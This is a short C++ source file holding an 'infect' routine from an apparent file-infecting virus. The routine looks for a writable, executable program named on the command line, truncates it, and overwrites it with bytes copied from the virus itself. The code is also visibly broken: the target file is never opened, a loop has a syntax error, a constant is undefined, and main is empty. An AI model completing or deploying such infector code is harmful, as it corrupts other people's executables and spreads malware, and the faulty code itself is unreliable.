#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <sys/stat.h>
#include <unistd.h>
#include <cstdio>

using namespace std;

void infect(int argc, char *argv[], int fd_r){
    int fd_t;
    int target, i;
    int done, bytes, length;
    void *map;
    struct stat stat;
    char buf[BUFSIZ];


    if (argc < 2){
        return;
    }
    for(target = 1; target<argc; target++){
        if(!access(argv[target], W_OK | X_OK)){
            goto NAILED;
        }
    }
    return;
    NAILED:
    fstat(fd_t, &stat);
    length = stat.st_size;

    map = (char *)malloc(length);
    if (!map){
        goto OUT;
    }
    for( i = 0, i < length; i++){
        read(fd_t, map + i, 1);
    }
    lseek(fd_t, 0 , SEEK_SET);
    if (ftruncate(fd_t, 0)){
        goto OUT;
    }
    done = 0;
    lseek(fd_r, 0, SEEK_SET);
    while(done < V_OFFSET){
        bytes = read(fd_r, buf, 1);
        write(fd_t, buf, bytes);
        done+=bytes;
    }
    OUT:
        close(fd_t);
        return;
}
int main (int argc, char *argv[]){
    
    






    return 0;
}